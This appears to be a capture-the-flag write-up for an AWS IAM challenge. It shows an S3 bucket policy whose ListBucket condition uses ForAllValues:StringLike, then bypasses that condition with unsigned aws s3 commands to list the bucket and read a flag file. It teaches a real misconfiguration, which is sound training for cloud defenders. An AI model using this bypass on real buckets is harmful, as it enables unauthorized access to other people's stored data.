# Challenge4

## We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

## Solution

- https://awstip.com/creating-unintentional-ways-to-bypass-aws-iam-policies-when-using-the-forallvalues-operator-3516a7f17ed0
- ForAllValues:StringLike - It also returns true if there are no keys in the request, or if the key values resolve to a null data set, such as an empty string.
- Hence the condition is bypassed.


### Method1

1. The GetObject has an open access, howerver the ListBucket is conditional based on ARN.
2. So using --no-sign-request we send an request without an ARN of the current user ( my assunption )
``` bash

> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ 
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png
```
```bash
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - 
{wiz:principal-arn-is-not-xxxxxxxxxxxx}
```
